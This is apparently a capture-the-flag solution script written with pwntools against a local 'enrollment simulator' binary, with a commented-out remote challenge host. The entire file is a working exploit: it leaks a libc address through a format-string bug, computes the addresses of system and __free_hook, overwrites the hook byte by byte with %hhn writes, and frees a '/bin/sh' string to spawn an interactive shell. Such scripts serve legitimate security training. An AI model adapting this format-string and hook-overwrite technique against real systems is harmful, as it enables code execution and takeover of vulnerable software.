from pwn import * 

binary = "./program_patched"
p = process(binary)
#p = remote("chal.firebird.sh", 35042)
elf = ELF(binary)
libc = ELF("./libc.so.6")
context.binary = binary
context.log_level = 'debug'

s = '''
b * enrollment_simulator+218
'''
#gdb.attach(p, s)


def enroll(p, email, reason):
    p.sendlineafter(b"What would you like to do?\n", b"1")
    p.sendlineafter(b"Please enter your ITSC email:\n", email)
    p.sendlineafter(b"Since the Add-Drop period has passed, you need you provide special reason for late enrollment:\n", reason)

def view_application(p):
    p.sendlineafter(b"What would you like to do?\n", b"4")
    
    p.recvline_contains(b"Reason")  # Skip the "Reason for late enrollment:" line


def submit_application(p):
    p.sendlineafter(b"What would you like to do?\n", b"5")

def quit_app(p, confirm=True):
    p.sendlineafter(b"What would you like to do?\n", b"6")
    p.sendlineafter(b"Are you sure you want to quit without enrolling in any of the available courses? (y/n)\n", 
                   b"y" if confirm else b"n")


enroll(p, p64(0xbeefdead), b"%23$p\n")

view_application(p)

leak = int(p.recvline().decode(), 16)
libc_base = leak - 0x24083
sys_addr = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']


print(hex(sys_addr))

for i in range(6):
    byte_to_write = (sys_addr >> 8 * i)  & 0xff
    dest = free_hook + i
    payload = f"%{byte_to_write}c%8$hhn".encode()
    enroll(p, p64(dest), payload)
    view_application(p)

enroll(p, p64(0xdeadbeef), b'/bin/sh\x00')
submit_application(p)


p.interactive()